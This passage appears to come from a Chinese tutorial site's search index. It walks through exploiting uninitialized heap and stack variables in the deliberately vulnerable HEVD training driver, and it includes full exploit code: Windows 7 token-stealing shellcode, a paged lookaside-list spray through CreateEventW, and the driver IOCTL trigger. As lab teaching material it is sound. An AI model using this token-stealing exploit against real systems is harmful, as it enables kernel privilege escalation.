\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u79cd\u65b9\u6cd5\u4eb2\u6d4b\u53ef\u7528\u5e76\u4e14\u5e08\u5085\u4eec\u4e5f\u90fd\u662f\u7528\u7684\u8fd9\u79cd\u65b9\u6cd5 \u6240\u4ee5\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528 CreateEventW \u800c\u4e0d\u662f CreateEventA\uff1f\u56e0\u4e3a\u6211\u4eec\u7684\u5730\u5740\u4e2d\u603b\u4f1a\u51fa\u73b0 00\uff0c\u7528 A \u7684\u8bdd\u5b57\u7b26\u4e32\u4f1a\u88ab\u622a\u65ad\uff0c\u7528 W \u7684\u8bdd\u8981\u9047\u5230 00 00 \u624d\u4f1a\u88ab\u622a\u65ad\uff0c\u8fd9\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002 \u4f7f\u6bcf\u4e2a lpName \u90fd\u4e0d\u76f8\u7b49\u7684\u539f\u56e0 \u56e0\u4e3a\u82e5\u662f\u6bcf\u4e2a lpName \u90fd\u76f8\u7b49\u7684\u8bdd\uff0c\u4f60\u5c31\u7b97\u8c03\u7528\u518d\u591a\u6b21 CreateEventW\uff0c\u5230\u6700\u540e\u6362\u9875\u6c60\u4e2d\u4e5f\u53ea\u5b58\u5728\u7740\u4e00\u5757 lpName\uff08\u56e0\u4e3a\u662f\u5b57\u7b26\u4e32\uff0c\u53ea\u8981\u6709\u4e00\u4efd\u5c31\u591f\u4e86\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u5230\u6700\u540e PPPagedLookasideList 248\u5b57\u8282\u94fe\u4e0a\u53ea\u4f1a\u5b58\u5728\u4e00\u5757\u7a7a\u95f2\u6362\u9875\u6c60\uff0c\u90a3\u8981\u662f\u8fd9\u4e2a\u6362\u9875\u6c60\u5728\u6211\u4eec\u7684\u6f0f\u6d1e\u89e6\u53d1\u524d\u88ab\u522b\u4eba\u7533\u8bf7\u4e86\u5462\uff1f\u6240\u4ee5\u586b\u6ee1PPPagedLookasideList 248\u5b57\u8282\u94fe\u624d\u662f\u6700\u5b89\u5168\u7684\u3002 \u5230\u8fd9\u91cc\u7684\u8bdd\u5e94\u8be5\u6ca1\u6709\u4ec0\u4e48\u76f2\u70b9\u4e86\u5427 emmm \u6700\u540e\u662f\u4e00\u4e2a\u6c42\u52a9 \u6211\u5728\u8c03\u8bd5\u65f6\u53d1\u73b0 \u524d\u56db\u4e2a\u5b57\u8282\u660e\u660e\u5e94\u8be5\u88ab\u6211\u4eec\u586b\u5145\u4e86 \\x41\\x41\\x41\\x41\uff0c\u5e76\u4e14\u5728\u9a71\u52a8\u7a0b\u5e8f\u628a\u8fd9\u5757\u7a7a\u95f4\u7533\u8bf7\u51fa\u6765\u4e4b\u540e\u5e94\u8be5\u662f\u6ca1\u6709\u5bf9\u524d\u56db\u4e2a\u5b57\u8282\u505a\u8fc7\u4efb\u4f55\u64cd\u4f5c\u7684\uff0c\u600e\u4e48\u5c31\u83ab\u540d\u5176\u5999\u5730\u88ab\u7f6e 0 \u4e86\uff1f 0x03 \u7ed3\u675f\u8bed \uff1a ) 2019.9.7","title":"\uff08\u516d\uff09HEVD \u672a\u521d\u59cb\u5316\u5806\u53d8\u91cf"},{"location":"HEVD/uninitializedHeapVariable/#0x00","text":"\u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u672a\u521d\u59cb\u5316\u6362\u9875\u6c60\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790\u5229\u7528\uff08Uninitialized Heap Variable\uff09","title":"0x00 \u524d\u8a00"},{"location":"HEVD/uninitializedHeapVariable/#0x01","text":"\u9996\u5148\u6253\u5f00 UninitializedMemoryPagedPool.c \u6587\u4ef6 \u903b\u8f91\u8fd8\u662f\u5f88\u6e05\u6670\u7684\uff0c\u82e5\u6211\u4eec\u7684\u8f93\u5165\u4e0d\u7b49\u4e8e MagicValue\uff0c\u5c31\u4f1a\u76f4\u63a5\u5bf9\u6ca1\u6709\u521d\u59cb\u5316\u7684\u6362\u9875\u6c60\u8fdb\u884c\u8c03\u7528\u3002 \u5c31\u50cf\u6211\u4eec\u5728\u672a\u521d\u59cb\u5316\u5185\u6838\u6808\u53d8\u91cf\u5229\u7528\u4e2d\u6240\u7528\u7684\u65b9\u6cd5\u4e00\u6837\uff0c\u82e5\u6211\u4eec\u53ef\u4ee5\u4f7f\u8fd9\u4e2a\u672a\u521d\u59cb\u5316\u7684\u6362\u9875\u6c60\u586b\u6ee1\uff08\u540e\u9762\u53ef\u4ee5\u77e5\u9053\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u7528\u55b7\u5c04\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3a\u8fd9\u6b21\u6211\u4eec\u53ef\u4ee5\u7cbe\u786e\u5730\u63a7\u5236\u8fd9\u4e2a\u6362\u9875\u6c60\u7684\u5185\u5bb9\uff09\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\uff0c\u90a3\u4e48\u4e4b\u540e\u53d1\u751f UninitializedMemory- Callback() \u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684 shellcode \u4e86\u3002 \u90a3\u4e48\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u63a7\u5236 UninitializedMemory \u7533\u8bf7\u7684\u6362\u9875\u6c60\u7684\u810f\u5185\u5bb9\u5462\uff1f \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7528\u5230 Lookaside List\uff08\u540e\u5907\u5217\u8868 | \u5feb\u67e5\u8868 | \u65c1\u89c6\u5217\u8868\uff09\uff0c\u5bf9\u4e8e Lookaside List \u662f\u4ec0\u4e48\u6709\u4e0d\u6e05\u695a\u7684\u53ef\u4ee5 \u9605\u8bfb\u4e00\u4e0b\u8fd9\u7bc7\u6587\u7ae0 \uff0c\u6211\u4e2a\u4eba\u89c9\u5f97\u67e5\u5f97\u5230\u7684\u8d44\u6599\u91cc\u5e94\u8be5\u7b97\u5199\u5f97\u4e0d\u9519\u7684\u4e86 \uff1a ) \u8fd9\u91cc\u4e5f\u518d\u5927\u6982\u89e3\u91ca\u4e00\u4e0b\u4ec0\u4e48\u662f Lookaside List \u9996\u5148\uff0c\u5728\u8fdb\u7a0b\u63a7\u5236\u5757\uff08KPRCB\uff09\u91cc\u4fdd\u5b58\u7740\u8fd9\u4e48\u4e00\u4e2a\u7ed3\u6784 GENERAL_LOOKASIDE \u7684\u7ed3\u6784\u4e3a\uff08\u8fd9\u91cc\u4f60\u80fd\u53d1\u73b0 Windows \u672a\u6587\u6863\u5316\u7684\u5f88\u591a\u540d\u5b57\u5728\u4e0d\u540c\u7684\u5730\u65b9\u6216\u591a\u6216\u5c11\u90fd\u6709\u70b9\u533a\u522b\uff0c\u6bd5\u7adf Windows \u662f\u95ed\u6e90\u7684\uff0c\u4f60\u53ea\u8981\u77e5\u9053\u5b83\u4eec\u8bf4\u7684\u662f\u540c\u4e00\u4e2a\u4e1c\u897f\u5c31\u597d\u4e86\uff09 typedef struct _GENERAL_LOOKASIDE { union { SLIST_HEADER ListHead ; SINGLE_LIST_ENTRY SingleListHead ; }; WORD Depth ; WORD MaximumDepth ; ULONG TotalAllocates ; union { ULONG AllocateMisses ; ULONG AllocateHits ; }; ULONG TotalFrees ; union { ULONG FreeMisses ; ULONG FreeHits ; }; POOL_TYPE Type ; ULONG Tag ; ULONG Size ; union { PVOID * AllocateEx ; PVOID * Allocate ; }; union { PVOID FreeEx ; PVOID Free ; }; LIST_ENTRY ListEntry ; ULONG LastTotalAllocates ; union { ULONG LastAllocateMisses ; ULONG LastAllocateHits ; }; ULONG Future [ 2 ]; } GENERAL_LOOKASIDE , * PGENERAL_LOOKASIDE ; \u6bcf\u4e00\u4e2a GENERAL_LOOKASIDE \u90fd\u662f\u4e00\u6761 Lookaside List\uff0c\u6240\u6709\u7684 GENERAL_LOOKASIDE \u7528\u53cc\u5411\u94fe\u8868\u4e32\u8d77\u6765\uff0c\u5176\u4e2d SINGLE_LIST_ENTRY SingleListHead \u662f\u4e00\u6761\u5177\u6709\u76f8\u540c\u5927\u5c0f\u7684\u7a7a\u95f2\u6362\u9875\u6c60\u5355\u5411\u94fe\u8868 WORD MaximumDepth \u662f\u5355\u5411\u94fe\u8868\u7684\u6700\u5927\u6df1\u5ea6\uff0c\u9ed8\u8ba4\u503c\u4e3a 256 LIST_ENTRY ListEntry \u5c31\u662f GENERAL_LOOKASIDE \u53cc\u5411\u94fe\u8868 \u5176\u7ed3\u6784\u5927\u81f4\u50cf\u8fd9\u4e2a\u6837\u5b50\uff08\u5e7c\u513f\u56ed\u753b\u5e08\u6765\u4e86\uff09 \u8bf4\u5b8c\u4e86 Lookaside List \u7684\u7ed3\u6784\u4e86\uff0c\u90a3\u4e48\u518d\u8bf4\u8bf4 Lookaside List \u662f\u4ec0\u4e48 \u7531\u4e8e\u8c03\u7528\u5185\u5b58\u7ba1\u7406\u5668\u6765\u8fdb\u884c\u5206\u914d\u5185\u5b58\u662f\u4e00\u4ef6\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u8017\u65f6\u7684\u64cd\u4f5c\uff0c\u82e5\u6211\u4eec\u9891\u7e41\u5730\u4f7f\u7528\u5185\u5b58\u7ba1\u7406\u5668\u5bf9\u5c0f\u5757\u5185\u5b58\u8fdb\u884c\u5206\u914d\u91ca\u653e\uff0c\u90a3\u4e48\u8fd9\u4e2a\u64cd\u4f5c\u4f1a\u964d\u4f4e\u7cfb\u7edf\u7684\u6027\u80fd\u3002\u56e0\u6b64\uff0c\u540e\u5907\u5217\u8868\uff08Lookaside List\uff09\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u63d0\u9ad8\u5c0f\u5757\u5185\u5b58\u5206\u914d\u548c\u7533\u8bf7\u6548\u7387\u7684\u673a\u5236\uff0c\u540e\u5907\u5217\u8868\u7528\u6765\u8fdb\u884c\u56fa\u5b9a\u5927\u5c0f\u5185\u5b58\u5757\u7684\u5c0f\u5185\u5b58\u5757\u7684\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u3002 \u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5f53\u6211\u4eec\u4f7f\u7528 ExAllocatePoolWithTag \u7533\u8bf7\u4e00\u4e2a\u5c0f\u5757\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u4f1a\u9996\u5148\u5c1d\u8bd5\u4ece KPRCB \u4e2d\u7684 PP(N)PagedLookasideList \u5206\u914d\u5185\u5b58\u3002\u5728\u5206\u914d\u5185\u5b58\u65f6\uff0c\u540e\u5907\u5217\u8868\u4e2d\u7684\u5185\u5b58\u5757\u53ea\u63d0\u4f9b\u6ee1\u8db3\u5927\u5c0f\u7b26\u5408\u7684\u7533\u8bf7\uff0c\u5426\u5219\u4e0d\u4e88\u5904\u7406 \u518d\u770b\u5230\u6211\u4eec\u7684 UninitializedMemory \u7ed3\u6784\u3002 typedef struct _UNINITIALIZED_MEMORY_POOL { ULONG_PTR Value ; FunctionPointer Callback ; ULONG_PTR Buffer [ 58 ]; } UNINITIALIZED_MEMORY_POOL , * PUNINITIALIZED_MEMORY_POOL ; 4 + 4 + 58 * 4 + pool header = 248 256 \u6240\u4ee5\u8bf4\uff0cUninitializedMemory \u5c5e\u4e8e\u5c0f\u5757\u5185\u5b58\uff0c\u7cfb\u7edf\u4f1a\u9996\u5148\u5c1d\u8bd5\u4ece PPPagedLookasideList \u4e2d\u5206\u914d\u7533\u8bf7\u7684\u6362\u9875\u6c60\u3002 \u5230\u8fd9\u91cc\u5c31\u660e\u4e86\u4e86\uff0c\u6211\u4eec\u82e5\u4f7f PPPagedLookasideList \u4e2d\u586b\u6ee1\u6211\u4eec\u7684\u810f\u7a7a\u95f2\u5185\u5b58\u5757\uff0c\u7b49\u4f1a\u513f UninitializedMemory \u53c8\u4ece PPPagedLookasideList \u7533\u8bf7\u6362\u9875\u6c60\u5757\uff0c\u53d1\u751f\u672a\u521d\u59cb\u5316\u53d8\u91cf\u8c03\u7528\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684 shellcode \u4e86\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u4f7f\u7a7a\u95f2\u5185\u5b58\u5757\u53d8\u810f\u5462\uff1f\u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u6c60\u6ea2\u51fa\u4e00\u7ae0\u4e2d\u4f7f\u7528\u7684\u51fd\u6570 CreateEvent \u5417\uff1f \u867d\u7136 CreateEvent \u5bf9\u8c61\u662f\u5728\u975e\u6362\u9875\u6c60\u4e2d\u7684\uff0c\u4f46\u662f\u5b83\u7684\u7b2c\u56db\u4e2a\u53c2\u6570 lpName \u5176\u5b9e\u662f\u4fdd\u5b58\u5728\u6362\u9875\u6c60\u4e2d\u7684\u3002\u5b83\u7684\u7c7b\u578b\u4e3a LPCSTR\uff0c\u8981\u63a7\u5236 256 \u4e2a\u5b57\u8282\u8fd8\u662f\u53ef\u4ee5\u505a\u5230\u7684\u3002","title":"0x01 \u672a\u521d\u59cb\u5316\u5806\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790"},{"location":"HEVD/uninitializedHeapVariable/#0x02","text":"\u9996\u5148\u8fd8\u662f\u5148\u8d34\u4e0a exp // uninitializedHeapVariable.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h /* char shellcode[] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; */ #define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread #define EPROCESS_OFFSET 0x050 // nt!_ETHREAD.ApcState.Process #define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId #define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink #define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token #define SYSTEM_PID 0x004 // SYSTEM Process PID VOID shellCode () { __asm { nop ; nop ; nop ; nop ; pushad ; Save registers state ; Start of Token Stealing Stub xor eax , eax ; Set ZERO mov eax , fs :[ eax + KTHREAD_OFFSET ]; Get nt ! _KPCR . PcrbData . CurrentThread ; _KTHREAD is located at FS : [ 0x124 ] mov eax , [ eax + EPROCESS_OFFSET ]; Get nt ! _KTHREAD . ApcState . Process mov ecx , eax ; Copy current process _EPROCESS structure mov edx , SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4 SearchSystemPID : mov eax , [ eax + FLINK_OFFSET ]; Get nt ! _EPROCESS . ActiveProcessLinks . Flink sub eax , FLINK_OFFSET cmp [ eax + PID_OFFSET ], edx ; Get nt ! _EPROCESS . UniqueProcessId jne SearchSystemPID mov edx , [ eax + TOKEN_OFFSET ] ; Get SYSTEM process nt ! _EPROCESS . Token mov [ ecx + TOKEN_OFFSET ], edx ; Replace target process nt ! _EPROCESS . Token ; with SYSTEM process nt ! _EPROCESS . Token ; End of Token Stealing Stub popad ; Restore registers state ret ; } } int main () { printf ( shellcode address : 0x%p , shellCode ); WCHAR lpName [ 0xf0 / 2 ] = { 0 }; // \u56e0\u4e3a\u4e00\u4e2aUnicode\u662f2\u4e2a\u5b57\u8282 memset ( lpName , \\x41 , sizeof ( lpName )); for ( int i = 0 ; i 256 ; i ++ ) { * ( PDWORD )(( char * ) lpName + 4 ) = ( DWORD32 ) shellCode ; // \u8fd9\u91cc\u4e3a\u4ec0\u4e48\u8981\u5148 (char *)\uff0c\u56e0\u4e3a\u4e00\u4e2aWCHAR\u662f2\u4e2a\u5b57\u8282 // \u8981\u662f\u4e0d(char *)\u7684\u8bdd\u4f1a\u8dd1\u5230(char *)lpName + 8\u7684\u4f4d\u7f6e * ( PDWORD )(( char * ) lpName + 0xf0 - 4 ) = i ; } HANDLE spray [ 256 ] = { 0 }; for ( int i = 0 ; i 256 ; i ++ ) { spray [ i ] = CreateEventW ( NULL , FALSE , FALSE , ( LPCWSTR ) lpName ); } for ( int i = 0 ; i 256 ; i ++ ) { CloseHandle ( spray [ i ]); } int value = 0x1 ; int * payload = value ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , 0x222033 , payload , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; } \u8fd9\u91cc\u7a0b\u5e8f\u5927\u81f4\u5728\u505a\u4ec0\u4e48\u7ed3\u5408 0x01 \u5c0f\u8282\u6765\u770b\u5e94\u8be5\u8fd8\u662f\u5f88\u6e05\u6670\u7684\u3002\u53ea\u662f\u4ee3\u7801\u4e2d\u6709\u4e9b\u7ec6\u8282\u6211\u8981\u89e3\u91ca\u4e00\u4e0b","title":"0x02 \u672a\u521d\u59cb\u5316\u5806\u53d8\u91cf\u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/uninitializedHeapVariable/#createeventw","text":"\u770b\u8fc7\u6211\u4e4b\u524d\u6587\u7ae0\u7684\u670b\u53cb\u5e94\u8be5\u53ef\u4ee5\u53d1\u73b0\u6211\u4e4b\u524d\u7684\u6587\u7ae0\u7528\u7684\u90fd\u662f char shellcode [] = {...} LPVOID ptr = VirtualAlloc ( 0 , , , ) RtlCopyMemory ( ptr , , ) \u8fd9\u79cd\u5f62\u5f0f\u6765\u4fdd\u5b58 shellcode \u7684\u3002\u4f46\u662f\u4f60\u53d1\u73b0\u6211\u8fd9\u6b21\u662f\u5c06 shellcode \u76f4\u63a5\u5199\u5728\u4ee3\u7801\u6bb5\u4e2d\u7684\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f \u4f60\u82e5\u662f\u81ea\u5df1\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u4f1a\u53d1\u73b0\u7528 VirtualAlloc \u5206\u914d\u7684\u5730\u5740\u5927\u81f4\u90fd\u662f 0x000d0000 \u8fd9\u6837\u7684\u683c\u5f0f\u7684\uff0c\u82e5\u662f\u81ea\u9876\u5411\u4e0b\u5206\u7684\u8bdd\u5927\u81f4\u90fd\u662f 0x74ef0000 \u8fd9\u6837\u7684\u683c\u5f0f\u7684\u3002\u4f46\u662f\u4f60\u770b\u6211\u4eec lpName \u53c2\u6570\u7c7b\u578b\u662f LPCSTR\u3002\u4f17\u6240\u5468\u77e5\u5b57\u7b26\u4e32\u9047\u5230 00 \u5c31\u76f4\u63a5\u622a\u65ad\u4e86\uff0c\u8fd9\u6837\u5b50\u6211\u4eec\u7684 payload \u6839\u672c\u65e0\u6cd5\u5b8c\u6574\u5730\u4f20\u4e0a\u53bb\u3002 \u90a3\u4e48\u600e\u4e48\u529e\u5462\uff1f \u7528 VirtualAlloc \u65f6\u6307\u5b9a\u57fa\u5730\u5740\u53ef\u884c\u5417\uff1f\u6309\u7406\u6765\u8bf4\u8fd9\u662f\u53ef\u884c\u7684\uff0c\u4f46\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u9664\u4e86 0 \u8ba9\u7cfb\u7edf\u81ea\u52a8\u5206\u914d\u5916\uff0c\u6211\u5c31\u6ca1\u5206\u914d\u6210\u529f\u8fc7 emmmmm \u7528 Heap \u6765\u4fdd\u5b58 shellcode \u5462\uff1f\u5c1d\u8bd5\u4e86\u4e00\u4e0b\u9ed8\u8ba4\u5806\u7684\u5206\u914d\u5730\u5740\u5927\u81f4\u662f 0x00344290 \u8fd9\u6837\u7684\u683c\u5f0f\u7684\uff0c\u6ca1\u6709\u4e24\u4e2a\u8fde\u7eed\u5728\u4e00\u8d77\u7684 00\uff0c\u53ea\u8981\u628a\u5b57\u7b26\u7f16\u7801\u53d8\u6210 WCHAR \u5c31\u53ef\u4ee5\u4e86\u3002\u6240\u4ee5\u6309\u7406\u6765\u8bf4\u8fd9\u4e2d\u65b9\u6cd5\u53ef\u884c\uff0c\u4e0d\u8fc7\u6211\u81ea\u5df1\u6ca1\u8bd5\u8fc7 \u4e0d\u4fdd\u5b58 shellcode \u4e86\uff0c\u76f4\u63a5\u5c06 shellcode \u5199\u5728\u4ee3\u7801\u6bb5\u4e2d\uff0c\u8fd9\u65f6\u4f60\u4f1a\u53d1\u73b0 shellcode \u7684\u5730\u5740\u5927\u81f4\u662f 0x00df1000\u3002\u8fd8\u662f\u6ca1\u6709\u4e24\u4e2a\u8fde\u7eed\u5728\u4e00\u8d77\u7684 00\uff0c\u53ea\u8981\u628a\u5b57\u7b26\u7f16\u7801\u53d8\u6210 WCHAR \u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u79cd\u65b9\u6cd5\u4eb2\u6d4b\u53ef\u7528\u5e76\u4e14\u5e08\u5085\u4eec\u4e5f\u90fd\u662f\u7528\u7684\u8fd9\u79cd\u65b9\u6cd5 \u6240\u4ee5\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528 CreateEventW \u800c\u4e0d\u662f CreateEventA\uff1f\u56e0\u4e3a\u6211\u4eec\u7684\u5730\u5740\u4e2d\u603b\u4f1a\u51fa\u73b0 00\uff0c\u7528 A \u7684\u8bdd\u5b57\u7b26\u4e32\u4f1a\u88ab\u622a\u65ad\uff0c\u7528 W \u7684\u8bdd\u8981\u9047\u5230 00 00 \u624d\u4f1a\u88ab\u622a\u65ad\uff0c\u8fd9\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002","title":"\u4f7f\u7528 CreateEventW \u7684\u539f\u56e0"},{"location":"HEVD/uninitializedHeapVariable/#lpname","text":"\u56e0\u4e3a\u82e5\u662f\u6bcf\u4e2a lpName \u90fd\u76f8\u7b49\u7684\u8bdd\uff0c\u4f60\u5c31\u7b97\u8c03\u7528\u518d\u591a\u6b21 CreateEventW\uff0c\u5230\u6700\u540e\u6362\u9875\u6c60\u4e2d\u4e5f\u53ea\u5b58\u5728\u7740\u4e00\u5757 lpName\uff08\u56e0\u4e3a\u662f\u5b57\u7b26\u4e32\uff0c\u53ea\u8981\u6709\u4e00\u4efd\u5c31\u591f\u4e86\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u5230\u6700\u540e PPPagedLookasideList 248\u5b57\u8282\u94fe\u4e0a\u53ea\u4f1a\u5b58\u5728\u4e00\u5757\u7a7a\u95f2\u6362\u9875\u6c60\uff0c\u90a3\u8981\u662f\u8fd9\u4e2a\u6362\u9875\u6c60\u5728\u6211\u4eec\u7684\u6f0f\u6d1e\u89e6\u53d1\u524d\u88ab\u522b\u4eba\u7533\u8bf7\u4e86\u5462\uff1f\u6240\u4ee5\u586b\u6ee1PPPagedLookasideList 248\u5b57\u8282\u94fe\u624d\u662f\u6700\u5b89\u5168\u7684\u3002 \u5230\u8fd9\u91cc\u7684\u8bdd\u5e94\u8be5\u6ca1\u6709\u4ec0\u4e48\u76f2\u70b9\u4e86\u5427 emmm \u6700\u540e\u662f\u4e00\u4e2a\u6c42\u52a9 \u6211\u5728\u8c03\u8bd5\u65f6\u53d1\u73b0 \u524d\u56db\u4e2a\u5b57\u8282\u660e\u660e\u5e94\u8be5\u88ab\u6211\u4eec\u586b\u5145\u4e86 \\x41\\x41\\x41\\x41\uff0c\u5e76\u4e14\u5728\u9a71\u52a8\u7a0b\u5e8f\u628a\u8fd9\u5757\u7a7a\u95f4\u7533\u8bf7\u51fa\u6765\u4e4b\u540e\u5e94\u8be5\u662f\u6ca1\u6709\u5bf9\u524d\u56db\u4e2a\u5b57\u8282\u505a\u8fc7\u4efb\u4f55\u64cd\u4f5c\u7684\uff0c\u600e\u4e48\u5c31\u83ab\u540d\u5176\u5999\u5730\u88ab\u7f6e 0 \u4e86\uff1f","title":"\u4f7f\u6bcf\u4e2a lpName \u90fd\u4e0d\u76f8\u7b49\u7684\u539f\u56e0"},{"location":"HEVD/uninitializedHeapVariable/#0x03","text":"\uff1a ) 2019.9.7","title":"0x03 \u7ed3\u675f\u8bed"},{"location":"HEVD/uninitializedStackVariable/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u672a\u521d\u59cb\u5316\u5185\u6838\u6808\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790\u5229\u7528 (Uninitialized Stack Variable) 0x01 \u672a\u521d\u59cb\u5316\u6808\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790 \u9996\u5148\u6211\u4eec\u6253\u5f00 UninitializedMemoryStack.c \u6587\u4ef6 \u7ed3\u5408\u5b9a\u4e49 UninitializedMemory \u53d8\u91cf\u65f6\u6ca1\u6709\u5bf9\u5b83\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u6211\u4eec\u7684\u8f93\u5165\u4e0d\u7b49\u4e8e MagicValue \u65f6\uff0c\u7a0b\u5e8f\u4f1a\u76f4\u63a5 call [ UninitializedMemory + 4]\uff0c\u800c\u8fd9\u4e2a\u503c\u56e0\u4e3a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\uff0c\u53c8\u6ca1\u6709\u88ab\u8d4b\u503c\uff0c\u6240\u4ee5\u4f1a\u76f4\u63a5\u8c03\u7528\u6808\u4e0a\u7684\u810f\u6570\u636e\u3002\u82e5\u6808\u4e0a\u7684\u810f\u6570\u636e\u662f\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u53c8\u53ef\u4ee5\u63a5\u7ba1\u6307\u4ee4\u6d41\u4e86\u3002 \u95ee\u9898\u662f\uff0c\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u4f7f\u6808\u4e0a\u7684\u810f\u6570\u636e\u53d8\u4e3a\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u5462\uff1f \u8fd9\u91cc\u53ef\u4ee5\u7528\u5230\u4e00\u79cd\u53eb\u505a\u6808\u55b7\u5c04\u7684\u65b9\u6cd5\uff0c\u5c06\u5927\u5757\u7684\u6808\u7a7a\u95f4\u63d0\u524d\u7528\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u53bb\u6539\u5199\u3002\u4ee5\u540e\u82e5\u662f\u5728\u8fd9\u4e2a\u6808\u533a\u57df\u4e0a\u53d1\u751f\u4e86\u5bf9\u672a\u521d\u59cb\u5316\u51fd\u6570\u6307\u9488\u7684\u8c03\u7528\uff0c\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684\u6307\u4ee4\u6d41\u4e86\u3002 \u90a3\u4e48\u6211\u4eec\u5982\u4f55\u505a\u5230\u5bf9\u5185\u6838\u6808\u8fdb\u884c\u55b7\u5c04\u5462\uff1f\uff08\u56e0\u4e3a\u6211\u4eec\u7684\u6f0f\u6d1e\u662f\u53d1\u751f\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u7684\uff0c\u6f0f\u6d1e\u4ee3\u7801\u6240\u4f7f\u7528\u7684\u6808\u7a7a\u95f4\u662f\u5185\u6838\u6808\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u5bf9\u5185\u6838\u6808\u8fdb\u884c\u55b7\u5c04\u800c\u4e0d\u662f\u7528\u6237\u6808\uff09 \u8fd9\u91cc\u53ef\u4ee5\u7528\u5230 NtMapUserPhysicalPages \u51fd\u6570\u3002\u6211\u4eec\u5148\u770b\u770b\u8fd9\u4e2a\u51fd\u6570\u7684\u5b98\u65b9\u6587\u6863 \u8fd9\u4e2a\u51fd\u6570\u6b63\u5e38\u6765\u8bf4\u662f\u7528\u5728 AWE \u7684\u4f7f\u7528\u4e2d\u7684\u3002\u4f46\u662f\u8fd9\u5bf9\u6211\u4eec\u6765\u8bf4\u4e0d\u91cd\u8981\uff0c\u6211\u4eec\u7684\u76ee\u7684\u662f\u6808\u55b7\u5c04\u3002\u7a0d\u5fae\u5230 wrk1.2 \u4e2d\u770b\u770b\u5b83\u7684\u6e90\u7801\uff0c\u6211\u8fd9\u91cc\u5927\u6982\u5c06\u4e0e\u6808\u55b7\u5c04\u76f8\u5173\u7684\u4f2a\u4ee3\u7801\u5448\u73b0\u51fa\u6765 #define COPY_STACK_SIZE 1024 NTSTATUS NtMapUserPhysicalPages ( __in PVOID VirtualAddress , __in ULONG_PTR NumberOfPages , __in_ecount_opt ( NumberOfPages ) PULONG_PTR UserPfnArray ) { ... ULONG_PTR StackArray [ COPY_STACK_SIZE ]; ... PoolArea = ( PVOID ) StackArray [ 0 ]; ... if ( NumberOfPages COPY_STACK_SIZE ) { PoolArea = ExAllocatePoolWithTag ( NonPagedPool , NumberOfBytes , wRmM ); if ( PoolArea == NULL ) { return STATUS_INSUFFICIENT_RESOURCES ; } } Status = MiCaptureUlongPtrArray ( PoolArea , UserPfnArray , NumberOfPages ); ... } NTSTATUS MiCaptureUlongPtrArray 